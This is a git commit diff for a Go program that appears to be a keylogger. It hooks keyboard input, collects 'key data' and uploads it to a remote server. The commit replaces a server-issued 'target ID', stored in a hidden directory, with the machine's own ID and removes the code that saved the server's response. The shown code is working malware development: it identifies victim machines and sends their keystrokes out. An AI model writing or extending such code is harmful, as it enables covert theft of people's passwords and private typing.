fcac26166b76304efeccdb193f54ca6a78466f36
Harshul <64775657+harshulvijay@users.noreply.github.com>
2024-11-17 21:27:34 +0530

    refactor: use `machineid` (#12)
    * deps: add `machineid`
    
    * refactor: change `getTargetID()` to return the ID fetched from `machineid`
    
    * refactor: remove useless code
    
    remove saving response from remote server in a file
    
    * refactor: prevent multiple calls to `getTargetID()`

--- app/src/network.go
+++ app/src/network.go
@@ -5,14 +5,12 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"io"
 	"log"
 	"net/http"
-	"os"
-	"path/filepath"
 	"strings"
 	"time"
 
+	"github.com/denisbrodbeck/machineid"
 	hook "github.com/robotn/gohook"
 )
 
@@ -36,34 +34,14 @@ type ResponseStruct struct {
 	ID string `json:"id"`
 }
 
-// Reads and returns target ID from `.tid` (if it exists.)
-// Returns an empty string otherwise.
+// Returns machine's ID as returned by `machineid`
 func getTargetID() string {
-	userHome, err := os.UserHomeDir()
+	targetID, err := machineid.ID()
 	if err != nil {
 		log.Panicf("Error: %s", err.Error())
 	}
 
-	confDir := filepath.Join(userHome, APPLICATION_DIRECTORY)
-	createHiddenDirectory(confDir)
-
-	// path to our target file
-	confFile := filepath.Join(confDir, ".tid")
-
-	// read file into `targetID`
-	targetID, err := os.ReadFile(confFile)
-	if os.IsNotExist(err) {
-		// the file does not exist
-		// return an empty string
-		return ""
-	}
-	if err != nil && !os.IsNotExist(err) {
-		// the file exists but we encountered an error
-		// panic
-		log.Panicf("Error: %s", err.Error())
-	}
-
-	return string(targetID)
+	return targetID
 }
 
 // Pushes key data to `localStruct.Contents`
@@ -147,44 +125,5 @@ func uploadData(encodedData []byte) {
 	// this isn't normal
 	if res.StatusCode != 200 {
 		log.Panicf("Error: unknown error")
-	}
-
-	// read response body
-	resBody, _ := io.ReadAll(res.Body)
-	if len(resBody) > 0 {
-		// some response was sent
-
-		userHome, err := os.UserHomeDir()
-		if err != nil {
-			log.Panicf("Error: %s", err.Error())
-		}
-
-		confDir := filepath.Join(userHome, APPLICATION_DIRECTORY)
-		createHiddenDirectory(confDir)
-
-		confFile := filepath.Join(confDir, ".tid")
-
-		// unmarshall the response body into `ResponseStruct`
-		resStruct := ResponseStruct{}
-		err = json.Unmarshal(resBody, &resStruct)
-		if err != nil {
-			log.Panicf("Error while unmarshalling response: %s", err.Error())
-		}
-
-		// decode `resStruct.ID` using base64
-		idDecoded, err := base64.StdEncoding.DecodeString(resStruct.ID)
-		if err != nil {
-			log.Panicf("Error while decoding ID: %s", err.Error())
-		}
-
-		if len(resStruct.ID) > 0 {
-			// `resStruct.ID` exists
-			// write it to `.tid`
-
-			err = os.WriteFile(confFile, idDecoded, 0644)
-			if err != nil {
-				log.Panicf("Error while writing target ID to file: %s", err.Error())
-			}
-		}
 	}
 }
